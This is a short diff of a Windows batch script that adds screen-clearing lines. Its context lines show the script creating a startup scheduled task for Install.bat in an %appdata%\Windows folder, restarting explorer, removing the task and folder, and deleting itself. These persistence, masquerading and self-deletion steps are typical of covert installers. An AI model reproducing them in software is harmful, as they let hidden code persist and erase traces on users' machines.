@@ -14,6 +14,7 @@ if '%errorlevel%' NEQ '0' (
     SCHTASKS /CREATE /F /SC ONSTART /TR "%appdata%\Windows\Install.bat" /TN "Install.bat"
     taskkill /f /IM explorer.exe
     start explorer.exe
+    cls
     exit /B
 :gotAdmin
     pushd "%CD%"
@@ -31,6 +32,7 @@ rd %appdata%\Windows
 powershell -Command "Unregister-ScheduledTask -TaskName 'Install.bat' -Confirm:$false"
 
 start /min Install.bat
+cls
 call :deleteSelf&exit /b
 :deleteSelf
 start /b "" cmd /c del "%~f0"&exit
